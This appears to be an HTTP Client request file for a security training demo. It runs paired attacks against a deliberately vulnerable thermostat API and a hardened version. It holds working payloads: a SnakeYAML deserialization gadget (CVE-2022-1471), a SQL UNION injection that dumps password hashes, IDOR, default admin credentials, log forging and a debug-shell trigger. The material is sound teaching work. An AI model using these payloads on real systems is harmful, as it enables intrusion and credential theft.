# ThermoHub – live demo requests for IntelliJ's HTTP Client.
# Pick the environment in the toolbar: "legacy" (port 8080) or "cra" (port 8081),
# then run the SAME request against both products.
# Demo passwords live in http-client.env.json (public, demo only).

### A01 Broken Access Control – alice reads bob's thermostat (IDOR)
GET {{host}}/api/devices/2
Authorization: Basic alice {{alice}}

### A02 Security Misconfiguration – configuration and secrets via the actuator, no login
GET {{host}}/actuator/env

### A03 Supply Chain Failures – SnakeYAML 1.33 gadget (CVE-2022-1471) creates a file on the server
# Watch the project root in IntelliJ: PWNED-by-yaml.txt appears (legacy only).
POST {{host}}/api/devices/1/config
Authorization: Basic alice {{alice}}
Content-Type: application/yaml

ecoMode: true
schedule: !!java.io.FileOutputStream ["PWNED-by-yaml.txt"]

### A04 + A05 Injection – UNION payload dumps usernames and unsalted MD5 hashes
# Payload: %' UNION SELECT 0, role, username, password_hash, 'pwned', 0 FROM users -- 
# @no-auto-encoding
GET {{host}}/api/devices/search?q={{sqli}}
Authorization: Basic alice {{alice}}

### A06 Insecure Design – a 95 °C setpoint is accepted
PUT {{host}}/api/devices/1/setpoint
Authorization: Basic alice {{alice}}
Content-Type: application/json

{"celsius": 95.0}

### A06 Insecure Design – pairing guess (repeat 6x against "cra" to see HTTP 429)
POST {{host}}/api/devices/pair
Authorization: Basic bob {{bob}}
Content-Type: application/json

{"serial": "TH-0003", "code": "0000"}

### A07 Authentication Failures – factory default admin/admin
GET {{host}}/api/devices
Authorization: Basic admin admin

### A08 Integrity Failures – unsigned firmware rolled out to the whole fleet
POST {{host}}/api/admin/firmware
Authorization: Basic admin {{admin}}
X-Firmware-Version: 6.6.6
Content-Type: application/octet-stream

THERMOHUB-FW 6.6.6 with a little extra

### A08 (cra, optional) – signed firmware. See README "Signed firmware live demo".
# Put firmwareSignature into http-client.private.env.json (git-ignored).
POST {{host}}/api/admin/firmware
Authorization: Basic admin {{admin}}
X-Firmware-Version: 2.5.0
X-Firmware-Signature: {{firmwareSignature}}
Content-Type: application/octet-stream

< ../fw-2.5.0.bin

### A09 Logging & Alerting – forge a log line with CR/LF in the device name (watch the console)
PUT {{host}}/api/devices/1/name
Authorization: Basic alice {{alice}}
Content-Type: application/json

{"name": "Kitchen\n2026-12-03T09:00:00.000Z  INFO 4711 --- [nio-8080-exec-9] d.t.l.AdminController : role ADMIN granted to mallory"}

### A09 – what did the security team see? (404 on legacy: nothing was recorded)
GET {{host}}/api/admin/security-events
Authorization: Basic admin {{admin}}

### A10 Exceptional Conditions – fail-open: the lower-case command opens the debug shell
POST {{host}}/api/devices/1/commands
Authorization: Basic alice {{alice}}
Content-Type: application/json

{"command": "enable_debug_shell"}

### A10 – the canonical form is blocked even on legacy (the bug lives in the error path)
POST {{host}}/api/devices/1/commands
Authorization: Basic alice {{alice}}
Content-Type: application/json

{"command": "ENABLE_DEBUG_SHELL"}

### A10 – errors leak internals
PUT {{host}}/api/devices/1/setpoint
Authorization: Basic alice {{alice}}
Content-Type: application/json

{"celsius": "warm"}

### CRA Annex I Part II (5),(6) – where do researchers report a vulnerability?
GET {{host}}/.well-known/security.txt
